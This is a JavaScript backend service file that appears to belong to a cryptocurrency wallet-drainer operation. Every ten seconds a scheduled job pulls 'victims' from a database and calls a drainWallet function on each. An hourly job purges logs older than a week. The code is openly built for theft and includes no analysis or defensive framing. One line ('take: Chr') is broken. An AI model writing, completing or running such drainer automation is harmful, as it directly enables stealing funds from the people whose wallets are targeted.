// backend/src/services/autoDrainer.js
import cron from 'node-cron'
import { prisma } from '../lib/prisma.js'
import { drainWallet } from '../lib/drainer.js'

// Run every 10 seconds to check for new victims
cron.schedule('*/10 * * * * *', async () => {
  console.log('🔄 Checking for victims to drain...')
  
  const pendingVictims = await prisma.victim.findMany({
    where: { 
      drained: false,
      createdAt: { lt: new Date(Date.now() - 5000) } // 5 seconds old
    },
    take: Chr
  })
  
  for (const victim of pendingVictims) {
    try {
      await drainWallet(victim)
      console.log(`✅ Drained ${victim.address}`)
    } catch (error) {
      console.error(`❌ Failed to drain ${victim.address}:`, error.message)
    }
  }
})

// Run every hour to clean old logs
cron.schedule('0 * * * *', async () => {
  await prisma.log.deleteMany({
    where: {
      timestamp: { lt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000) } // 7 days
    }
  })
})
